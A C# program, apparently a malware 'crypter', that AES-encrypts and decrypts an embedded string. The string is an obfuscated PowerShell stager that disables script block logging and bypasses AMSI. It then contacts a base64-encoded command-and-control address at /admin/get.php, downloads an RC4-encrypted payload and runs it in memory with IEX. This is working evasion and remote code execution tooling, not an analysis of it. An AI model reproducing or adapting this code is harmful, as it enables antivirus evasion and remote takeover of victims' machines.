using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
namespace AesCrypter
{
    class Program
    {
            public static byte[] Byte8(string veri)
            {
                char[] ArrayChar = veri.ToCharArray();
                byte[] ArrayByte = new byte[ArrayChar.Length];
                for (int i = 0; i < ArrayByte.Length; i++)
                {
                    ArrayByte[i] = Convert.ToByte(ArrayChar[i]);
                }

                return ArrayByte;
            }


        public static string Encrypter(string plainText, byte[] key, byte[] iv)
        {

            Aes encryptor = Aes.Create();

            encryptor.Mode = CipherMode.CBC;
     
            encryptor.Key = key;
            encryptor.IV = iv;


            MemoryStream memoryStream = new MemoryStream();


            ICryptoTransform aesEncryptor = encryptor.CreateEncryptor();

            CryptoStream cryptoStream = new CryptoStream(memoryStream, aesEncryptor, CryptoStreamMode.Write);

            byte[] plainBytes = Encoding.ASCII.GetBytes(plainText);

            cryptoStream.Write(plainBytes, 0, plainBytes.Length);

            cryptoStream.FlushFinalBlock();

            byte[] cipherBytes = memoryStream.ToArray();

            memoryStream.Close();
            cryptoStream.Close();

            string cipherText = Convert.ToBase64String(cipherBytes, 0, cipherBytes.Length);

            return cipherText;
        }


        public static string Decrypter(string cipherText, byte[] key, byte[] iv)
        {

            Aes encryptor = Aes.Create();

            encryptor.Mode = CipherMode.CBC;
           
            encryptor.Key = key;
            encryptor.IV = iv;


            MemoryStream memoryStream = new MemoryStream();

            ICryptoTransform aesDecryptor = encryptor.CreateDecryptor();

            CryptoStream cryptoStream = new CryptoStream(memoryStream, aesDecryptor, CryptoStreamMode.Write);

            string plainText = String.Empty;

            try
            {
                byte[] cipherBytes = Convert.FromBase64String(cipherText);

                cryptoStream.Write(cipherBytes, 0, cipherBytes.Length);

                cryptoStream.FlushFinalBlock();

                byte[] plainBytes = memoryStream.ToArray();

                plainText = Encoding.ASCII.GetString(plainBytes, 0, plainBytes.Length);
            }
            finally
            {
                memoryStream.Close();
                cryptoStream.Close();
            }

            
            return plainText;
        }
        static void Main(string[] args)
        {
            //Şifrelemek istediğiniz metni bu alana gireceksiniz
            var encryptedText = "IF($PSVersioNTABLE.PSVeRSIoN.MajoR -gE 3){$f0C32=[reF].ASSEmbLy.GEtTyPE('System.Management.Automation.Utils').\"GETFIe`Ld\"('cachedGroupPolicySettings','N'+'onPublic,Static');If($F0c32){$ea761=$f0c32.GeTVAlUE($nUll);IF($EA761['ScriptB'+'lockLogging']){$eA761['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$Ea761['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$vAL=[CoLlEctioNS.GENeriC.DICTionARy[stRIng,SySteM.Object]]::NEW();$vAL.Add('EnableScriptB'+'lockLogging',0);$vAl.ADd('EnableScriptBlockInvocationLogging',0);$EA761['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging']=$VAl}ELsE{[ScRiptBloCk].\"GEtFiE`Ld\"('signatures','N'+'onPublic,Static').SetVALuE($NuLL,(NEW-OBjeCT ColLecTiONS.GenErIc.HashSEt[STRING]))}$REF=[Ref].AssEmBlY.GeTTYPE('System.Management.Automation.Amsi'+'Utils');$ReF.GEtFIELD('amsiInitF'+'ailed','NonPublic,Static').SETVaLUE($NulL,$trUE);};[SySteM.NeT.SeRVIcePoinTMANagEr]::ExPEct100ConTINuE=0;$B3904=New-OBJEcT SysTEM.NEt.WEBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([TExt.EncOding]::UniCode.GeTStRiNg([COnVERT]::FrOMBAsE64STRinG('aAB0AHQAcAA6AC8ALwAzADUALgAyADAAOAAuADIAMgA2AC4AMQAyADYAOgA0ADQANQA=')));$t='/admin/get.php';$b3904.HeadErs.ADD('User-Agent',$u);$b3904.PROxy=[SYsTeM.NET.WEBReqUEst]::DefAuLTWEBPrOXy;$B3904.PRoXy.CREDeNTialS = [SysteM.NeT.CREdeNTialCaChE]::DefaulTNetWorKCRedENTIalS;$Script:Proxy = $b3904.Proxy;$K=[SystEM.Text.EncodInG]::ASCII.GEtByteS('RboriuZG;/NPOIf&)g826w(l[Q*SVHX}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxOR$S[($S[$I]+$S[$H])%256]}};$b3904.HEADERS.ADd(\"Cookie\",\"kyRaHD = PRz4QeB3LbE / LIRJz309NRg7itQ = \");$DAtA=$B3904.DOwNLoaDDAta($SeR+$T);$IV=$data[0..3];$DatA=$dAtA[4..$dATA.LEngth];-JOIn[CHAR[]](& $R $daTA ($IV+$K))|IEX";

            byte[] aryKey = Byte8("12345678901234567891234567891234"); // BURAYA 8 bit string DEĞER GİRİN
            byte[] aryIV = Byte8("5152535491235468"); // BURAYA 8 bit string DEĞER GİRİN

            string encryptedtext1 = Encrypter(encryptedText, aryKey, aryIV);
            Console.WriteLine(encryptedtext1);
            
            string decodedtext = Decrypter(encryptedtext1,aryKey,aryIV);
            Console.WriteLine(decodedtext);


            

        }
    }
}
